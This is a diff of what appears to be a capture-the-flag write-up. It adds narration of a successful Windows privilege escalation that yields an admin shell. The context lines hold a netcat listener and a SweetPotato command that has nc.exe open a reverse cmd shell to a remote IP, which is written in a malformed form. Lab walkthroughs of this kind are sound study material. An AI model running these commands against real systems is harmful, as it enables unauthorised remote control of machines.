@@ -350,5 +350,8 @@ rlwrap nc -lvnp 4445
 .\SweetPotato.exe -p nc.exe -a "-e cmd 10..13.12.249 4445"
 ````
 ![image](https://user-images.githubusercontent.com/80599694/147992256-28dec5c2-f0ca-4083-84ae-14f0fc25cf1a.png)
-
+#### Well, it looks like SweetPotato was successful, we should go back to our terminal and check to see if we have a connection with Admin rights through our listener.
+![image](https://user-images.githubusercontent.com/80599694/147992381-92f0c62d-a5ee-4167-85cf-bd9d53fb4bf9.png)
+#### We got a shell!  Let's go get that Admin flag and finish the box.
+![image](https://user-images.githubusercontent.com/80599694/147992438-f6e910b4-ed9b-4c67-a945-8adb06404bf2.png)
 
